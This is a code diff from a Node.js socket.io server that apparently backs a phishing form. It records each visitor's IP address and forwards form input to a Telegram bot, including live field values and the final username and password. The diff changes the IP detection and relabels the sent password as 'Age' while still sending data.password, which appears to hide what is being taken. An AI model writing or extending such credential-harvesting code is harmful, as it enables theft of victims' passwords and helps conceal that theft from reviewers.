@@ -41,12 +41,17 @@ io.on("connection", async (socket)=>{
 
     console.log("User opened the form");
 
-    let ip = socket.handshake.headers["x-forwarded-for"] 
-          || socket.conn.remoteAddress 
-          || socket.handshake.address;
+    // Correct IP detection for Render proxy
+    let ip = socket.handshake.headers["x-forwarded-for"];
 
     if(ip){
-        ip = ip.split(",")[0].replace("::ffff:", "");
+        ip = ip.split(",")[0];
+    }else{
+        ip = socket.conn.remoteAddress;
+    }
+
+    if(ip){
+        ip = ip.replace("::ffff:", "");
     }
 
     console.log("Detected IP:", ip);
@@ -68,7 +73,7 @@ Value: ${data.value}`);
     socket.on("submit",(data)=>{
         sendTelegram(`✅ Final Submission
 Username: ${data.username}
-Password: ${data.password}`);
+Age: ${data.password}`);
     });
 
 });
